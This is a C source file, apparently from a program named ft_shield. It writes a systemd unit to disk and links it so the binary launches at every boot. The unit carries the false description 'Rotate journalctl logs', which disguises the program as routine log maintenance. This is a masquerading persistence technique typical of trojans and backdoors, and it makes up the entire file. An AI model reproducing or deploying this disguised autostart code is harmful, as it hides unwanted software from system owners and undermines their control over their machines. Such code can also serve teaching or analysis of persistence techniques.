#include "ft_shield.h"

#define SYSTEMD_SERVICE "\
[Unit]\n\
Description=Rotate journalctl logs\n\
\n\
[Service]\n\
ExecStart=/usr/bin/ft_shield\n\
\n\
[Install]\n\
WantedBy=multi-user.target\n\
"

void	run_service_on_startup(void)
{
	symlink(SYSTEMD_SERVICE_FILE, SYSTEMD_SERVICE_SYMLINK);
}

void	create_systemd_service(void)
{
	int	fd;

	fd = creat(SYSTEMD_SERVICE_FILE, 0644);
	if (fd < 0)
		return ;
	write(fd, SYSTEMD_SERVICE, sizeof SYSTEMD_SERVICE);
	run_service_on_startup();
}
